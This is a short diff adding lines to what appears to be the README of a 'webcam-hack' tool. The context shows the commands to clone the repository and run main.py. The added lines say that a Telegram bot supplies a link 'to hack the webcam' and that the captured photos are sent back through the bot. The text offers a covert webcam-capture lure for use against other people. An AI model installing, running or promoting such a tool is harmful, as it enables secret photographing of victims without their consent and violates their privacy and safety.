@@ -24,3 +24,6 @@ git clone https://github.com/MrFploit/webcam-hack
 cd webcam-hack
 python3 main.py 
 ```
+# at the end
+## Start the Telegram robot to get the link to hack the webcam
+## Photos will be sent to you in the robot
